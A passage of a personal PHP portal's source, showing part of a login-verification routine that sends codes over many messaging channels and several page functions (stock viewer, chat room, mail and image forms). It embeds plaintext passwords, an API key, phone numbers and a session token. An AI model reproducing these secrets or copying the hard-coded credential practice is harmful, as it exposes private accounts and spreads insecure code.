            elseif (strtolower(trim(request('verify'))) == 'msn'){
            }   
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
                 
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}   
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证成功！'), iconv('gb2312','gb2312','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}            
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证成功！,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               //$voxeo = new voxeo_class();
               //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('+8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
               
            }
       			elseif (strtolower(trim(request('verify'))) == 'fetion'){
       				
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
       				
							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// 手机号、飞信密码
							//$fetion->send('15998963077', iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}            
         }
         
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                                      
                   			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = randcode(32,'');
                   			unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
                   			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "", time() + 3600*24*31);
              		 			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'], time() + 3600*24*31);
               		 			
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);
                   			}else{
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);                   			
                   			}
                        break;
                }
                else{
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        }
                        else{
            if (strtolower(trim(request('verify'))) == 'sms'){
                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code is：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                                   
            }
            elseif (strtolower(trim(request('verify'))) == 'email'){
                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                                  
            }
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193验证您的访问权限失败'),
              'html' => iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}             
            elseif (strtolower(trim(request('verify'))) == 'msn'){
            }   
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}    
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证失败！'), iconv('gb2312','gb2312','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}      			           
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               //$voxeo = new imified_class();
               //$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('+8615998963077','Sorry! The verification code is：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                
            }   
        		elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
         			
							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// 手机号、飞信密码
							//$fetion->send('15998963077', iconv('gb2312','utf-8','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}           
                        }
                         

                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);                   
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);
                   			}else{
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);                   			
                   			}                        
                }
}
exit;
} // idoll function end
?>

<?php 
function stock_10jqka(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 股票");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="120%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" height="89%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="top" style="border:0">
                <td align="top" id="Picnik">
                <script language="JavaScript" type="text/javascript">
                        document.getElementById('Picnik').innerHTML = '<iframe src="http://www.10jqka.com.cn/flash/" id="10jqka" name="10jqka" quality="high" allowscriptaccess="always" allowfullscreen="true" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="100%" height="100%" frameborder="0" />';
                </script>
                </td>
        </tr>
</table>
<?php 
$style->footer();
//exit;
} // idoll function end
?>

<?php 
function stickam(){
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 会议");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left">
                        <script src="http://www.stickam.tv/js/ObjectControl.js"></script>
                        <script src="http://www.stickam.tv/js/one2one.js"></script>
                        <script language="javascript" type="text/javascript"> 
			function fullScreen(){
				window.moveTo(0,0);
				window.resizeTo(screen.width,screen.height-30);
			}
			function hideWarning(){
				document.getElementById('warningText').style.display="none";
			}
			</script>
                        <div align='center' width='100%' height='100%'>
                        <noscript>
                        	<SCRIPT>startChatRoom('955','675','chat_room','http://player.stickam.tv/flash/stickam/stickam_player.swf?app=stickam_chat_room.swf','userID=200000721441&userType=205&sessionType=115&langID=cn&webID=x3193:200000721441:123.144.2.82:1304242826:23d2e5e387928ce735785dcaf1f5a64c&skinName=room&skinType=room&ban=0&userIP=123.144.2.82&userName=x3193&hostName=http://www.stickam.tv&roomId=64705&roomName=X3193&password=&requirePassword=0','','','')</SCRIPT>
                        </noscript>
			<script>startChatRoom('900','630','chat_room','http://player.stickam.tv/flash/stickam/stickam_player.swf?app=stickam_chat_room.swf','userID=200000721441&userType=205&sessionType=115&langID=cn&webID=x3193:200000721441:123.144.4.160:1319951758:173b586b406c97b8ad8fe2b78e7d18d1&skinName=room&skinType=room&ban=0&userIP=123.144.4.160&userName=x3193&hostName=http://www.stickam.tv&roomId=71239&roomName=X3193%E8%81%8A%E5%A4%A9&password=&requirePassword=1','','','')</script>
			<script type="text/javascript"> 
			setTimeout("hideWarning()", 10000);
			</script>
                        </div>
                </td>
        </tr>   
</table>
<?php 
$style->footer();
//exit;
}
?>      

<?php 
function webxml(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 服务");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));

$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "bond":
                                        switch (trim(request('type'))) {  // case start
                                        case "exchange":
                                        break;
                                                default:
                                                                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=byban&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
                        &nbsp证券代码：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:77px;height:16px;font-size:12px">
                                <OPTION VALUE="<?php echo encodeuri("行情");?>">行情简报</OPTION>
                                <OPTION VALUE="<?php echo encodeuri("走势");?>">走势图</OPTION>
                                <OPTION VALUE="<?php echo encodeuri("K线");?>">K 线图</OPTION>
                                <OPTION VALUE="<?php echo encodeuri("外汇");?>"  onchange="exchange();">外汇行情</OPTION>
                        </SELECT>
                        &nbsp验证码：<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                                        break;
                                }
                break;
        case "travel":
                break;
        case "weather":
                break;
        case "TV":
                break;
        case "airline.a":
                                        switch (trim(request('bot'))) {  // case start
                                        case "1":
                                        break;
                                                default:
                                        break;
                                }       
                break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=byban&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
                        &nbsp域名：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                        &nbsp端口：<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                        <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px">
                                <OPTION VALUE="imap">IMAP</OPTION>
                                <OPTION VALUE="pop3">POP3</OPTION>
                                <OPTION VALUE="nntp">NNTP</OPTION>
                        </SELECT>
                        &nbsp验证码：<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>

<?php 
function picture(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 图片");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "robot.list":
                break;
        case "robot.create":
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
        document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
function dofiletype(){
        if (document.getElementById("filetype").value == "local"){
                document.getElementById("filepath").innerHTML = '&nbsp图片地址：<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
        }       
        else if(document.getElementById("filetype").value == "remote"){
                document.getElementById("filepath").innerHTML = '&nbsp图片地址：<input type="text" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
        }       
}
function dofileext(){
        if (document.getElementById("fileext").value == "ICON"){
                document.getElementById("iconsize").innerHTML = '<SELECT name="filetype" size="1" style="width:60px;height:16px;font-size:12px" onchange="dofiletype();" onmouseover="this.style.backgroundColor=\'#FCFC9D\';"><OPTION VALUE="1616">16*16</OPTION><OPTION VALUE="3232">32*32</OPTION><OPTION VALUE="4848">48*48</OPTION></SELECT>';
        }       
        else{
                document.getElementById("iconsize").innerHTML = '';
        }       
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="picture">
                        <form action="<?php echo ScriptPath();?>?api=picture&action=&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="picture">
                        <SELECT name="filetype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:75px;height:16px;font-size:12px" onchange="dofiletype();">
                                <OPTION VALUE="local">本地图片</OPTION>
                                <OPTION VALUE="remote">远程图片</OPTION>
                        </SELECT>
                        <span id="filepath">&nbsp图片地址：<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  </span>
                        &nbsp目标格式：
                        <SELECT name="fileext" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px" onchange="dofileext();">
                                <OPTION VALUE="XBM">XBM</OPTION>
                                <OPTION VALUE="ICON">ICON</OPTION>
                        </SELECT>
                        <span id="iconsize"></span>
                        &nbsp验证码：<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>

<?php 
function icon(){

$iconsize = '50';
$im = @imagecreate($iconsize, $iconsize);//创建长宽各50像素的图象，格式未定。

$background_color = imagecolorallocate($im, 128, 255, 255);//创建青色的“PHP GD”图象变量，以备用，这里作为背景色彩。
$text_color = imagecolorallocate($im, 0, 0, 255);//创建兰色文字的“PHP GD”专用变量，以备用。

$linecolor = imagecolorallocate($im, 0, 0, 0);//创建黑色实线的“PHP GD”专用变量，以备用。
imagesetthickness($im, 2);//定义实线的粗细。

imageline($im, 0, 1, $iconsize, 1, $linecolor);
imageline($im, 0, $iconsize-1, $iconsize, $iconsize-1, $linecolor);//在图片的顶部和底部画两条实线。

imagestring($im, 5, 3, 17,  "X3193", $text_color);//在图片中间部分输出兰色字体。
//$text = 'Testing...';
//$font = './arial.ttf';
//imagettftext($im, 20, 0, 10, 20, $text_color, $font, $text);// 利用根目录arial.ttf字体文件输出文字，需要众多字体文件。

$debug = "0";
if ($debug == '1'){
        header("Content-type: image/png");//调试时，输出PNG格式的图象，与imagepng配合使用。
        imagepng($im);//调试时，输出PNG格式的图象，与header()配合使用。
        return;
}

$size = 32;  
$resize_im = @imagecreatetruecolor($size,$size);  // 创建一幅真彩图象。
$resize = $iconsize;
imagecopyresampled($resize_im,$im,0,0,0,0,$size,$size,$resize,$resize);  // 重采样拷贝部分图像并调整大小到新真彩图象中。

$icon = new phpthumb_ico();  
$gd_image_array = array($resize_im);  
$icon_data = $icon->GD2ICOstring($gd_image_array); // 调用GD2ICON 函数库创建未命名ICON图象。

imagedestroy($im);//销毁原由的非ico格式图象。
imagedestroy($resize_im);//销毁原由的ico格式图象。

$filename = "X3193.ico";  
if(file_put_contents($filename, $icon_data)){  //保存ico图象。
        return 'ok';
}
else{  
        return "no";  
}

exit;
}
?>

<?php 
function jiankongbao(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 定时");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
